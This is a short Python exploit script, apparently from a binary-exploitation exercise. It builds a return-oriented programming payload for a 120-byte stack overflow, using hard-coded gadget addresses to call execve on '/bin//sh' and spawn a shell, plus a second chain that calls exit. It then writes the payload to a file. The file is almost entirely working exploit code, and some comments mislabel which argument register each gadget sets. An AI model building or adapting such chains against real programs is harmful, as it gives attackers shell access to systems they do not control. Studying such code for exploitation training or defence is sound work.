#!/usr/bin/env python3

from struct import pack

def exit():

    payload = b''

    # Junk
    payload += b'\x41' * 120

    # Gadgets
    
    # 1. Load system call number
    payload += pack('<Q', 0x000000000044b5ba)    # pop rsi ; ret
    payload += pack('<Q', 60)                    # exit's system call number
    payload += pack('<Q', 0x000000000041dd10)    # mov rax, rsi ; ret

    # 2. Load the first argument
    payload += pack('<Q', 0x00000000004006a6)    # pop rdi ; ret
    payload += pack('<Q', 1)                     # 1 - function's argument

    # 3. syscall
    payload += pack('<Q', 0x00000000004012cc)    # syscall

    return payload

def execve():
    
    payload = b''

    # Junk
    payload += b'\x41' * 120
    # Write the string "/bin//sh" into the address space
    # We are writing it in the data segment
    payload += pack('<Q', 0x0000000000410213) # pop rsi ; ret
    payload += pack('<Q', 0x00000000006b90e0) # @ .data
    payload += pack('<Q', 0x00000000004005af) # pop rax ; ret
    payload += b'/bin//sh'
    payload += pack('<Q', 0x000000000047f291) # mov qword ptr [rsi], rax ; ret
    payload += pack('<Q', 0x0000000000410213) # pop rsi ; ret
    payload += pack('<Q', 0x00000000006b90e8) # @ .data + 8
    payload += pack('<Q', 0x0000000000444330) # xor rax, rax ; ret
    payload += pack('<Q', 0x000000000047f291) # mov qword ptr [rsi], rax ; ret  

    # 1. Load system call number
    payload += pack('<Q', 0x00000000004005af)    # pop rax ; ret
    payload += pack('<Q', 59)                    # execve's system call number

    # 2. Argument 1 (address of "/bin//sh" into rdi
    payload += pack('<Q', 0x00000000004006a6) # pop rdi ; ret
    payload += pack('<Q', 0x00000000006b90e0) # @ .data
    
    # 3. Argument 2 (rsi = NULL / 0)
    payload += pack('<Q', 0x0000000000449025) # pop rdx ; ret
    payload += pack('<Q', 0x0000000000000000) # NULL / 0

    # 4. Argument 4 (rdx = NULL / 0)
    payload += pack('<Q', 0x0000000000410213) # pop rsi ; ret
    payload += pack('<Q', 0x0000000000000000) # NULL / 0

    # 5. syscall
    payload += pack('<Q', 0x00000000004012cc)    # syscall

    return payload

if __name__ == '__main__':
    
    payload = execve()
    fo = open('payload.txt', 'wb')
    fo.write(payload)
    fo.close()
